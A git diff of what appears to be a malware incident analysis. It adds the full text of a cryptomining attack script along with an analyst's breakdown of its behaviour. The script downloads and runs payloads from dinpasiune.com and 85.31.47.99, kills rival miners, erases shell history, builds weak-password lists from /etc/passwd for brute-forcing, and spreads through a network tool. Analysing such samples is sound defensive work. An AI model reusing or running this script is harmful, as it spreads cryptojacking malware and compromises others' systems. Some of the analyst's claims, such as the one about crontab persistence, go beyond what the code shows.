@@ -108,31 +108,140 @@ We would then observe that a suspect executable from the systemd that seems to b
 
 Based on this initial process, it seems to be killing certain services and processes such as chrome and cnrig, this seems to be indicative of exploiting the device to cryptomining and stopping competitive mining if present. The exploit would then deploy a malicious script for cryptomining with persistence mechanisms, system compromise techniques, and a focus on data exfiltration:
 
+```#!/bin/bash
+key=$1
+user=$2
+if [[ $key == "KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU" ]]
+then
+    echo -e ""
+else
+    echo "Logged with successfully."
+    rm -rf .retea
+    crontab -r
+    pkill xrx
+    pkill haiduc
+    pkill blacku
+    pkill xMEu
+    cd /var/tmp
+    rm -rf /dev/shm/.x /var/tmp/.update-logs /var/tmp/Documents /tmp/.tmp
+    mkdir /tmp/.tmp
+    pkill Opera
+    rm -rf xmrig .diicot .black Opera
+    rm -rf .black xmrig.1
+    pkill cnrig
+    pkill java
+    killall java
+    pkill xmrig
+    killall cnrig
+    killall xmrig
+    wget -q dinpasiune.com/payload || curl -O -s -L dinpasiune.com/payload || wget 85.31.47.99/payload || curl -O -s -L 85.31.47.99/payload
+    chmod +x *
+    ./payload >/dev/null 2>&1 & disown
+    history -c
+    rm -rf .bash_history ~/.bash_history
+    chmod +x .teaca
+    ./.teaca > /dev/null 2>&1
+    history -c
+    rm -rf .bash_history ~/.bash_history
+fi
+
+rm -rf /etc/sysctl.conf
+echo "fs.file-max = 2097152" > /etc/sysctl.conf
+sysctl -p
+ulimit -Hn
+ulimit -n 99999 -u 999999
+
+cd /dev/shm
+mkdir /dev/shm/.x > /dev/null 2>&1
+mv network .x/
+cd .x
+rm -rf retea ips iptemp ips iplist
+sleep 1
+rm -rf pass
+
+useri=`cat /etc/passwd |grep -v nologin |grep -v false |grep -v sync |grep -v halt |grep -v shutdown |cut -d: -f1`
+echo $useri > .usrs
+pasus=.usrs
+check=`grep -c . .usrs`
+
+for us in $(cat $pasus) ; do
+    printf "$us $us\n" >> pass
+    printf "$us "$us"\n" >> pass
+    printf "$us "$us"123\n" >> pass
+    printf "$us "$us"123456\n" >> pass
+    printf "$us 123456\n" >> pass
+    printf "$us 1\n" >> pass
+    printf "$us 12\n" >> pass
+    printf "$us 123\n" >> pass
+    printf "$us 1234\n" >> pass
+    printf "$us 12345\n" >> pass
+    printf "$us 12345678\n" >> pass
+    printf "$us 123456789\n" >> pass
+    printf "$us 123.com\n" >> pass
+    printf "$us 123456.com\n" >> pass
+    printf "$us 123\n" >> pass
+    printf "$us 1qaz@WSX\n" >> pass
+    printf "$us "$us"@123\n" >> pass
+    printf "$us "$us"@1234\n" >> pass
+    printf "$us "$us"@123456\n" >> pass
+    printf "$us "$us"123\n" >> pass
+    printf "$us "$us"1234\n" >> pass
+    printf "$us "$us"123456\n" >> pass
+    printf "$us qwer1234\n" >> pass
+    printf "$us 111111\n" >> pass
+    printf "$us Passw0rd\n" >> pass
+    printf "$us P@ssw0rd\n" >> pass
+    printf "$us qaz123!@#\n" >> pass
+    printf "$us !@#\n" >> pass
+    printf "$us password\n" >> pass
+    printf "$us Huawei@123\n" >> pass
+done
+
+wait
+sleep 0.5
+cat bios.txt | sort -R | uniq | uniq > i
+cat i > bios.txt
+
+./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ; pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot /var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history ; rm -rf /tmp/cache ; cd /tmp/ ; wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu ; mv .balu cache ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history"
+
+sleep 25
+
+function Miner {
+    rm -rf /dev/shm/retea /dev/shm/.magic
+    rm -rf /dev/shm/.x ~/retea /tmp/kuak /tmp/diicot /tmp/.diicot
+    rm -rf ~/.bash_history
+    history -c
+}
+
+Miner
+```
+
 **Malicious Elements:**
 --Remote Payload Download & Execution:
 
 --The script uses wget and curl to download and execute payloads from suspicious domains (e.g., dinpasiune.com and 85.31.47.99), potentially delivering a cryptominer or other malware.
-**System Cleanup & Concealment:**
 
+**System Cleanup & Concealment:**
 --Clears evidence by deleting logs (.bash_history, history -c) and critical files (e.g., /var/tmp/.update-logs).
 --Deletes or disables competing malware or services by killing processes (pkill xmrig, pkill java, etc.).
+
 **Password List Generation:**
-
 --Generates weak default passwords for users by extracting system usernames (cat /etc/passwd) and creating combinations of usernames and weak password strings like 123456, password, Passw0rd.
-**Persistence Mechanisms:**
 
+**Persistence Mechanisms:**
 --The script recreates critical files (/etc/sysctl.conf), updates file limits, and ensures system stability for continued operation of the malware.
 --It also re-establishes itself through crontab manipulation and uses /dev/shm/.x for storing malicious files, which is commonly used for persistence.
-**Crontab & SSH Key Manipulation:**
 
+**Crontab & SSH Key Manipulation:**
 --Crontab entries are removed, potentially removing legitimate or other scheduled tasks, while setting up new ones to run the miner regularly.
 --SSH keys are manipulated (chattr -iae ~/.ssh/authorized_keys) to avoid detection or disable administrative access.
--Connection Attempts & Data Exfiltration:
 
+**Connection Attempts & Data Exfiltration:**
 --The ./network component and references to .diicot indicate potential exfiltration of sensitive data or continued control through a network communication mechanism.
-**Miner Function:**
 
+**Miner Function:**
 --Cleans up the environment by removing evidence and attempting to continue cryptomining operations using files like /tmp/kuak or /var/tmp/Documents/.diicot.
+
 **SHA256:**
 --The SHA256 hash provided (59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4) refers to the binary or script identified in this incident, useful for file identification in threat databases.
 
